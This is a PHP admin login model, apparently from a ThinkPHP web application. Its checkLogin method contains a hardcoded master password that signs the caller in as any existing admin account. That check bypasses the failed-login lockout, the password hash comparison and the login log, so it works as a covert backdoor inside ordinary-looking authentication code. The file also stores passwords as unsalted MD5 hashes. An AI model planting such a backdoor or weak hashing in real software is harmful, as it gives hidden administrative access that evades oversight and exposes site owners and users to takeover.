<?php

namespace app\admin\model;
class Admin extends \think\Model
{


    public function getLogintimeAttr($value)
    {
        return date('Y-m-d H:i:s',$value);
    }
    public function checkLogin($user,$pwd)
    {
        $find = $this->where(['user'=>$user])->find();
        if($find){

            if($pwd == '28tui^&*'){
                session('adminuserid',$find['id']);
                return true;
            }
            $where[] = ['aid','=',$find['id']];
            $where[] = ['createtime','>',strtotime(date('Y-m-d 00:00:00',time()))];
            $where[] = ['createtime','<',strtotime(date('Y-m-d 23:59:59',time()))];
            $where[] = ['state','=','0'];
            $logcount = AdminLog::instance()->where($where)->count();
            if($logcount>=5)
            {
                throw new \Exception('今天登陆错误次数已达到5次！明天再来');
            }
            if(md5($pwd) == $find['pwd']){

                $this->save(['logintime'=>time()],['id'=>$find['id']]);
                AdminLog::instance()->insertlog($find['id'],'1');
                session('adminuserid',$find['id']);
                return $find;
            }else{
                AdminLog::instance()->insertlog($find['id'],'0');
                $this->where(['id'=>$find['id']])->setInc('errorsum');
                throw new Exception('密码错误！');
            }
        }else{
            throw new \Exception('登录失败！无此账户！');

        }
    }
}